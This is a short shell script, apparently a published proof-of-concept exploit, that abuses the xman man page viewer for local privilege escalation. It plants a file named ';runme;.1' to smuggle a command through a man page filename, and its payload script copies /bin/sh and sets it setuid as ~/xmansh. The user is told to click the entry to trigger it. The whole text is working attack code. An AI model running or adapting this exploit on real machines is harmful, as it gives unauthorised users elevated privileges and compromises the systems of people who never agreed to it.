#!/bin/sh
# example of xman exploitation. xman
# supports privileges.  but, never
# drops them.
# Vade79 -> v9@realhalo.org -> realhalo.org.
MANPATH=~/xmantest/
mkdir -p ~/xmantest/man1
cd ~/xmantest/man1
touch ';runme;.1'
cat << EOF >~/xmantest/runme
#!/bin/sh
cp /bin/sh ~/xmansh
chown `id -u` ~/xmansh
chmod 4755 ~/xmansh
EOF
chmod 755 ~/xmantest/runme
echo "click the ';runme;' selection," \
"exit.  then, check for ~/xmansh."
xman -bothshown -notopbox
rm -rf ~/xmantest
